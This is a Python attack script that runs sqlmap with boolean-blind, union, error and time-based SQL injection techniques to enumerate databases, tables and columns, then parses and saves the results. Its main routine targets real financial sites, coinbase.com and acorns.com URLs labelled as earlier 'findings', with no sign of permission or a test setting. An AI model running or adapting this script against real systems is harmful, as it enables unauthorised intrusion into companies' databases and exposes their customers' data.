#!/usr/bin/env python3

import subprocess
import json
import re
import time

def extract_with_advanced_sqlmap(url):
    """Extract database info with advanced SQLMap techniques"""
    print(f"[+] Advanced extraction from {url}")
    
    techniques = [
        {
            'name': 'Boolean Blind',
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=3', '--risk=2', '--technique=B',
                '--timeout=60', '--threads=5', '--dbs', '--tables', '--columns'
            ]
        },
        {
            'name': 'Union Based',
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent', 
                '--level=2', '--risk=2', '--technique=U',
                '--timeout=60', '--union-cols=1-20', '--dbs', '--tables', '--columns'
            ]
        },
        {
            'name': 'Error Based',
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=2', '--risk=2', '--technique=E', 
                '--timeout=60', '--dbs', '--tables', '--columns'
            ]
        },
        {
            'name': 'Time Based',
            'cmd': [
                'sqlmap', '-u', url, '--batch', '--random-agent',
                '--level=2', '--risk=2', '--technique=T',
                '--timeout=90', '--time-sec=5', '--dbs', '--tables', '--columns'
            ]
        }
    ]
    
    for technique in techniques:
        try:
            print(f"  [+] Trying {technique['name']}...")
            result = subprocess.run(technique['cmd'], capture_output=True, text=True, timeout=180)
            
            # Extract information
            databases = extract_databases_from_output(result.stdout)
            tables = extract_tables_from_output(result.stdout)
            columns = extract_columns_from_output(result.stdout)
            
            if databases or tables or columns:
                return {
                    'url': url,
                    'technique': technique['name'],
                    'databases': databases,
                    'tables': tables,
                    'columns': columns,
                    'success': True
                }
                
        except subprocess.TimeoutExpired:
            print(f"    [-] Timeout for {technique['name']}")
        except Exception as e:
            print(f"    [-] Error for {technique['name']}: {e}")
    
    return None

def extract_databases_from_output(output):
    """Extract database names from SQLMap output"""
    databases = []
    
    # Multiple patterns to catch different output formats
    patterns = [
        r'available databases \[(\d+)\]:\s*\n(.*?)(?:\n\[|\nback-end|\Z)',
        r'current database:\s*\'([^\']+)\'',
        r'retrieved:\s*\'([^\']+)\'\s*.*database',
        r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'\[INFO\].*databases.*:\s*(.*)',
        r'back-end DBMS:\s*.*\s+database\s+\'([^\']+)\''
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 1:
                    # Parse database list
                    db_text = match[1]
                    for db in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', db_text):
                        if len(db) > 1 and db.lower() not in ['null', 'none', 'error']:
                            databases.append(db)
                else:
                    if len(match[0]) > 1 and match[0].lower() not in ['null', 'none', 'error']:
                        databases.append(match[0])
            else:
                if len(match) > 1 and match.lower() not in ['null', 'none', 'error']:
                    databases.append(match)
    
    return list(set(databases))

def extract_tables_from_output(output):
    """Extract table names from SQLMap output"""
    tables = []
    
    patterns = [
        r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\n\[(\d+)\s*tables?\]:\s*\n(.*?)(?:\n\[|\nDatabase:|\Z)',
        r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'retrieved:\s*\'([^\']+)\'\s*.*table',
        r'\[INFO\].*tables.*:\s*(.*)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 2:
                    # Parse table list from database section
                    table_text = match[2]
                    for table in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', table_text):
                        if len(table) > 1 and table.lower() not in ['null', 'none', 'error']:
                            tables.append(table)
                elif len(match) > 0:
                    if len(match[0]) > 1 and match[0].lower() not in ['null', 'none', 'error']:
                        tables.append(match[0])
            else:
                if len(match) > 1 and match.lower() not in ['null', 'none', 'error']:
                    tables.append(match)
    
    return list(set(tables))

def extract_columns_from_output(output):
    """Extract column names from SQLMap output"""
    columns = []
    
    patterns = [
        r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\n\[(\d+)\s*columns?\]:\s*\n(.*?)(?:\n\[|\nTable:|\Z)',
        r'Column:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'retrieved:\s*\'([^\']+)\'\s*.*column',
        r'\[INFO\].*columns.*:\s*(.*)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 2:
                    # Parse column list from table section
                    col_text = match[2]
                    for col in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', col_text):
                        if len(col) > 1 and col.lower() not in ['null', 'none', 'error']:
                            columns.append(col)
                elif len(match) > 0:
                    if len(match[0]) > 1 and match[0].lower() not in ['null', 'none', 'error']:
                        columns.append(match[0])
            else:
                if len(match) > 1 and match.lower() not in ['null', 'none', 'error']:
                    columns.append(match)
    
    return list(set(columns))

def main():
    # URLs from our previous scan + known vulnerable ones
    target_urls = [
        # New findings
        'https://coinbase.com/user?id=1',
        'https://coinbase.com/profile?id=1', 
        'https://coinbase.com/search?q=test',
        # Previous findings
        'https://www.acorns.com/learn/search/?q=invest',
        'https://www.acorns.com/learn/?page=3',
        'https://www.acorns.com/support/search/?q=password'
    ]
    
    successful_extractions = []
    
    print("=== Targeted Database Extraction ===")
    
    for i, url in enumerate(target_urls):
        if len(successful_extractions) >= 5:
            break
            
        print(f"\n[{i+1}/{len(target_urls)}] Extracting from: {url}")
        
        result = extract_with_advanced_sqlmap(url)
        if result:
            successful_extractions.append(result)
            print(f"[!] SUCCESS: {result['technique']} worked!")
            print(f"    Databases: {len(result['databases'])} - {result['databases']}")
            print(f"    Tables: {len(result['tables'])} - {result['tables'][:5]}{'...' if len(result['tables']) > 5 else ''}")
            print(f"    Columns: {len(result['columns'])} - {result['columns'][:5]}{'...' if len(result['columns']) > 5 else ''}")
        else:
            print(f"[-] No extraction successful for {url}")
    
    # Save results
    with open('targeted_extraction_results.json', 'w') as f:
        json.dump(successful_extractions, f, indent=2)
    
    # Create final summary
    print(f"\n=== FINAL EXTRACTION RESULTS ===")
    print(f"Successfully extracted database info from {len(successful_extractions)} URLs:")
    
    for i, result in enumerate(successful_extractions, 1):
        print(f"\n{i}. URL: {result['url']}")
        print(f"   Technique: {result['technique']}")
        print(f"   Databases ({len(result['databases'])}): {', '.join(result['databases'])}")
        print(f"   Tables ({len(result['tables'])}): {', '.join(result['tables'])}")
        print(f"   Columns ({len(result['columns'])}): {', '.join(result['columns'])}")
    
    return len(successful_extractions)

if __name__ == "__main__":
    main()
